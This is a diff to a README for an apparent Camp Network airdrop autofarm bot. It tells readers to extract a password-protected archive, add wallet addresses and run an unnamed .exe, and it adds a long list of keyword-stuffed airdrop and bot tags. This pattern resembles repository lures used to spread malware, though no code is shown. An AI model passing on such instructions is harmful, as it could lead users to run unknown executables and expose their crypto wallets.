@@ -22,9 +22,9 @@ Automated node management solution for Camp Network - a decentralized storage pl
 
 ## 📌 Usage Guide  
 1. Extract files using provided password  
-2. Configure storage paths in `config.ini`  
-3. Add wallet addresses in `wallets.json`  
-4. Launch `CampNode.exe`  
+2. Configure storage paths in `.ini`  
+3. Add wallet addresses in `.json`  
+4. Launch `.exe`  
 
 ### 🔍 SEO-Optimized Tags  
 - Camp Network  
@@ -52,3 +52,16 @@ Automated node management solution for Camp Network - a decentralized storage pl
 - Camp autoclaimer bot  
 - Camp airdrop  
 - Camp bot  
+- bot
+- crypto
+- camp
+- airdrop
+- camp yellow
+- camp free
+- camp network
+- camp test dev
+- camp network bot
+- camp bot
+- camp autofarm
+- camp miner
+- camp airdrop
